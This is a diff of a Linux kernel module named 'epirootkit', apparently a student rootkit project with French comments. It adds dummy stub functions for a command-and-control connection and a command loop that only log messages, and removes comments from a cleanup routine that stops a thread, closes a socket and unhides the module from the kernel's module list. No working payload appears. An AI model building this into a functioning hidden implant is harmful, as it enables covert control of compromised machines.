@@ -66,6 +66,22 @@ static void unhide_module(void) {
     }
 }
 
+// Implémentation minimale pour compilation
+static int connect_to_c2_server(void) {
+    pr_info("epirootkit: Dummy connect_to_c2_server called\n");
+    return 0; // succès factice
+}
+
+// Implémentation minimale pour compilation
+static int command_loop(void *data) {
+    pr_info("epirootkit: Dummy command_loop started\n");
+    while (!kthread_should_stop()) {
+        ssleep(1);
+    }
+    pr_info("epirootkit: Dummy command_loop stopping\n");
+    return 0;
+}
+
 static int __init epirootkit_init(void) {
     int err;
 
@@ -97,14 +113,12 @@ static int __init epirootkit_init(void) {
 static void __exit epirootkit_exit(void) {
     pr_info("epirootkit: Cleaning up module...\n");
 
-    // Nettoyage du thread en premier
     if (g_thread) {
         pr_info("epirootkit: Stopping thread...\n");
         kthread_stop(g_thread);
         g_thread = NULL;
     }
 
-    // Nettoyage de la socket ensuite
     if (g_sock) {
         pr_info("epirootkit: Closing socket...\n");
         sock_release(g_sock);
@@ -112,7 +126,6 @@ static void __exit epirootkit_exit(void) {
         notify_connection_state(0);
     }
 
-    // Restauration du module dans la liste si nécessaire
     if (prev_module && THIS_MODULE) {
         pr_info("epirootkit: Unhiding module...\n");
         list_add(&THIS_MODULE->list, prev_module);
